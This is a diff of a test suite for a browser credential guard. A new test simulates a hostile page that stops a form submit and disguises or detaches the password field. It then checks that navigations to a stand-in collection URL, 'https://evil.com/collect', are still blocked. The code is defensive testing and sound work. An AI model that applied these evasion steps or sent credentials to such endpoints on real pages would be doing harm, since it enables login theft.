@@ -2156,10 +2156,35 @@ describe("credential_guard", () => {
         expect(mockShowModal).toHaveBeenCalledTimes(2);
       });
 
-      it("ignores script navigations it never resumed, forms without a password, and the off mode", async () => {
+      it("fails closed when the page hides the password field or moves the submitter after a stopped submit", async () => {
+        const { form, btn } = formWithButton();
+        const [guard] = nav.guardSubmit;
+        const pw = form.querySelector('input[type="password"]') as HTMLInputElement;
+        // The written listener stops the submit, then makes the form look password-free.
+        const hide = (e: Event): void => {
+          e.stopImmediatePropagation();
+          pw.type = "text";
+        };
+        window.removeEventListener("submit", guard!, true);
+        window.addEventListener("submit", hide, true);
+        window.addEventListener("submit", guard!, true);
+        try {
+          await dispatchSubmit(form, btn);
+          expect(navigate(btn, "https://evil.com/collect", true).defaultPrevented).toBe(true);
+          pw.type = "password";
+          await dispatchSubmit(form, btn);
+          btn.remove(); // a detached submitter has form === null
+          expect(navigate(btn, "https://evil.com/collect", true).defaultPrevented).toBe(true);
+        } finally {
+          window.removeEventListener("submit", hide, true);
+        }
+      });
+
+      it("lets through forms whose submit the guard saw, script navigations it never resumed, and the off mode", async () => {
         const { btn } = formWithButton();
         const plain = createPlainForm();
         expect(navigate(btn, "https://example.com/session", false).defaultPrevented).toBe(false);
+        await dispatchSubmit(plain);
         expect(navigate(plain, "https://evil.com/collect", true).defaultPrevented).toBe(false);
         setCachedCredMode("off");
         expect(navigate(btn, "https://evil.com/collect", true).defaultPrevented).toBe(false);
